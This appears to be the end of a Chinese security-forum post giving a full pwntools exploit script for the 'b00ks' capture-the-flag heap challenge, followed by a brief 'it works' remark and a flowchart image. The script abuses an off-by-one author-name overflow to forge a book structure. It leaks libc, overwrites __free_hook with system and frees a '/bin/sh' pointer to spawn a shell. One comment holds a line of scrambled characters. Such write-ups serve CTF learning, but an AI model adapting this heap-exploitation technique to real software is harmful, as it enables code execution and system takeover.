
```python
#!/usr/bin/env python

# -*- coding=utf-8 -*-



from pwn import *



context(log_level='debug', os='linux')



def create_book(target, name_size, book_name, desc_size, book_desc):

    target.recv()

    target.sendline('1')

    target.sendlineafter('Enter book name size: ', str(name_size))

    target.sendlineafter('Enter book name (Max 32 chars): ', book_name)

    target.sendlineafter('Enter book description size: ', str(desc_size))

    target.sendlineafter('Enter book description: ', book_desc)



def delete_book(target, book_id):

    target.recv()

    target.sendline('2')

    target.sendlineafter('Enter the book id you want to delete: ', str(book_id))



def edit_book(target, book_id, book_desc):

    target.recv()

    target.sendline('3')

    target.sendlineafter('Enter the book id you want to edit: ', str(book_id))

    target.sendlineafter('Enter new book description: ', book_desc)



def print_book(target):

    target.recvuntil('>')

    target.sendline('4')



def change_author_name(target, name):

    target.recv()

    target.sendline('5')

    target.sendlineafter('Enter author name: ', name)



def input_author_name(target, name):

    target.sendlineafter('Enter author name: ', name)



DEBUG = 1

LOCAL = 1



if LOCAL:

    target = process('./b00ks')

else:

    target = remote('127.0.0.1', 5678)



libc = ELF('./libc.so.6')

# used for debug

image_base = 0x555555554000



if DEBUG:

    pwnlib.gdb.attach(target, 'b *%d\nc\n' % (image_base+0x1245))



input_author_name(target, 'a'*32)

create_book(target, 140 ,'book_1', 140, 'first book created') #description的地址空间要大一些，使得伪造的bokk_struct落在description中。



# leak boo1_struct addr

print_book(target)



target.recvuntil('a'*32)

temp = target.recvuntil('\x0a')



book1_struct_addr = u64(temp[:-1].ljust(8, '\x00'))

#print hex(book1_struct_addr)

book2_struct_addr = book1_struct_addr + 0x30



create_book(target, 0x21000, 'book_2', 0x21000, 'second book create')  #0x21000保证mmap分配内存



# fake book1_struct

payload = 'a' * 0x40 + p64(1) + p64(book2_struct_addr + 8) * 2 + p64(0xffff)

#payload = 'a' * 0x40 + p64(1) + p64(book2_struct_addr + 8) + p64(0x555555554870) + p64(0xffff)

edit_book(target, 1, payload)



change_author_name(target, 'a'*32)

print 'aaaaaaaaaaaaaaaaaaaaaaaa'

print (book2_struct_addr + 8)

# leak book2_name ptr

print_book(target)



target.recvuntil('Name: ')

temp = target.recvuntil('\x0a')

book2_name_ptr = u64(temp[:-1].ljust(8, '\x00'))

# print hex(book2_name_ptr)



# find in debug: mmap_addr - libcbase

offset =  0x7ffff7fb7010 - 0x7ffff7a0d000

libcbase = book2_name_ptr - offset

print "offset="+ hex(offset)

print "libcbase="+ hex(libcbase)



free_hook = libc.symbols['__free_hook'] + libcbase

system = libc.symbols['system'] + libcbase

binsh_addr = libc.search('/bin/sh').next() + libcbase

print "free_hook = "+ hex(free_hook)

print "system = "+ hex(system)

print "binsh_addr = "+ hex(binsh_addr)



payload = p64(binsh_addr) + p64(free_hook)

edit_book(target, 1, payload)



payload = p64(system)

edit_book(target, 2, payload)



## bb7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7q4)9J5k6i4N6W2K9i4S2A6L8W2)9J5k6i4q4I4i4K6u0W2j5$3!0E0i4K6u0r3M7#2)9J5c8Y4l9I4e0i4k6j5k6K6y4Z5P5p5y4Q4y4h3k6A6b7@1N6s2K9U0k6X3g2X3j5#2f1b7`.`.

delete_book(target, 2)

target.interactive()
```

![](https://bbs.kanxue.com/upload/attach/202002/822769_YRFD67CDBXKQW69.jpg)

打通了

最后附上一个流程图 手写的，凑活着看吧

![](https://bbs.kanxue.com/upload/attach/201809/822769_235FQKU9ZTWWP4X.jpg)

idd&xhh

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2019-10-30 22:55 被Seclusion编辑，原因：

上传的附件：

- [pwn\_f39be3022bd1c5ad07cf0f11836b5dd9.rar](javascript:void(0);)

  （658.64kb，58次下载）
